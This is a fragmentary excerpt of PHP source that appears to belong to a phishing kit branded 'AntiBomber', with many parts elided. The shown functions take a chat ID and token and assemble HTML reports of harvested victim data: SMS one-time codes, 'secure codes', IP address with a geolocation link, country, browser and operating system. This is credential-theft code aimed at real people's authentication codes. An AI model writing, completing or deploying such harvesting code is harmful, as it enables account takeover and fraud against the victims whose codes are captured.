...
function _user(){
	...
	function AntiBombResI($chat_id, $METRI_TOKEN, $nm, $nu, $epx, $vv, $user, $referer, $text = null){
	...
	function AntiBombResII($chat_id, $METRI_TOKEN, $stre, $maiz, $zi, $Vie, $tl, $em, $user, $referer, $text = null){
		$mail = "
	...
	function AntiBombResIII($chat_id, $METRI_TOKEN, $tantan,$secure, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			################ <font style='color: #820000;'>&#x2620; AntiBomber &#x2620;</font> ################
			===============[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]
			<font style='color:#9c0000;'>&#x272A;</font> S.M.S  1  = <span style='color:#0070ba;'>".$tantan."</span><br>
			Secure Code 1 : <span style='color: #0070ba;'>".$secure."</span>
			===============[ <font style='color: #0a5d00;'>USER INFORMATION</font> ]
			<font style='color:#9c0000;'>&#x272A;</font> SYSTEME = <span style='color:#0070ba;'>".AntiBomb_OS($referer)."</span>
			<font style='color:#9c0000;'>&#x272A;</font> BROWSER = <span style='color:#0070ba;'>".$referer."</span>
			<font style='color:#9c0000;'>&#x272A;</font> IP INFO = <a style='color:#0070ba;' href='https://geoiptool.com/en/?ip=".$user."' target='_blank'>`[ ".$_SESSION['country']." ] => ".$user."</a>
	...
	function AntiBombResIV($chat_id, $METRI_TOKEN, $tantan2, $secure, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			################ <font style='color: #820000;'>&#x2620; AntiBomber &#x2620;</font> ################
	...
	function AntiBombResVI($chat_id, $METRI_TOKEN, $tantan3, $secure, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			################ <font style='color: #820000;'>&#x2620; AntiBomber &#x2620;</font> ################
